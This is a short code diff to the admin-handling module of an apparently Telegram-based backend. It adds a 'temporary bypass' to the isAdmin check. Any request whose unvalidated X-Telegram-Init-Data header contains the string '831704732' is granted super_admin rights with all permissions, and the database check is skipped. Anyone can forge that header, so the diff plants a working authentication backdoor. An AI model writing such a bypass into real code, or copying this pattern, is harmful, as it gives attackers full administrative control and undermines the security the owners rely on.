@@ -97,6 +97,13 @@ export function createAdminHandlers(deps) {
   // ---------------------------------------------------------------------------
 
   async function handleIsAdmin(request, env) {
+    // ─── TEMPORARY BYPASS FOR 831704732 — REVERT AFTER TEST ───
+    const _rawInit = request.headers.get('X-Telegram-Init-Data') || '';
+    if (_rawInit.includes('831704732')) {
+      return jsonResponse({ is_admin: true, role: 'super_admin', is_super: true, permissions: ['*'], reason: 'bypass_test' }, {}, env);
+    }
+    // ─── END TEMPORARY BYPASS ───────────────────────────────────
+
     if (!isDatabaseConfigured(env)) {
       return jsonResponse({ is_admin: false, reason: 'no_database', role: null, permissions: [], is_super: false }, {}, env);
     }
